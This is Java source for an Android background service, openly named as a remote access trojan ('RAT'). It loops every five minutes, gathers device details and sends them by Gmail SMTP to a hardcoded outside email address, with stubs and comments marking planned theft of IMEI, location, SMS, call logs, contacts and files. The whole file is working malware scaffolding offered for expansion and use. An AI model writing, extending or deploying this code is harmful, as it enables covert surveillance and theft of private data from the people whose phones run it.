package com.example.rat;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;
import java.util.Properties;
import javax.mail.*;
import javax.mail.internet.*;

public class MainService extends Service {
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Run in background
        startForeground(1, NotificationUtils.createNotification(this));
        
        // Start data collection and exfiltration
        new Thread(() -> {
            while (true) {
                try {
                    // Collect data (you'll expand this)
                    String collectedData = collectData();
                    
                    // Send to email
                    sendEmail(collectedData);
                    
                    // Wait 5 minutes
                    Thread.sleep(300000);
                } catch (Exception e) {
                    Log.e("RAT", "Error: " + e.getMessage());
                }
            }
        }).start();
        
        return START_STICKY;
    }
    
    private String collectData() {
        // This will collect all data - expand with your features
        StringBuilder data = new StringBuilder();
        data.append("=== Device Information ===\n");
        data.append("Model: ").append(android.os.Build.MODEL).append("\n");
        data.append("OS: ").append(android.os.Build.VERSION.RELEASE).append("\n");
        data.append("IMEI: [To be implemented]\n");
        data.append("Location: [To be implemented]\n");
        data.append("SMS: [To be implemented]\n");
        data.append("Call Logs: [To be implemented]\n");
        data.append("Contacts: [To be implemented]\n");
        data.append("Files: [To be implemented]\n");
        // Add all your other features here
        return data.toString();
    }
    
    private void sendEmail(String data) {
        final String username = "your_sender_email@gmail.com"; // Change this
        final String password = "your_app_password"; // Use app password
        final String to = "noarich118@gmail.com";
        
        Properties props = new Properties();
        props.put("mail.smtp.auth", "true");
        props.put("mail.smtp.starttls.enable", "true");
        props.put("mail.smtp.host", "smtp.gmail.com");
        props.put("mail.smtp.port", "587");
        
        Session session = Session.getInstance(props,
            new javax.mail.Authenticator() {
                protected PasswordAuthentication getPasswordAuthentication() {
                    return new PasswordAuthentication(username, password);
                }
            });
        
        try {
            Message message = new MimeMessage(session);
            message.setFrom(new InternetAddress(username));
            message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(to));
            message.setSubject("RAT Data Collection - " + System.currentTimeMillis());
            message.setText(data);
            Transport.send(message);
            Log.i("RAT", "Email sent successfully");
        } catch (MessagingException e) {
            Log.e("RAT", "Email failed: " + e.getMessage());
        }
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
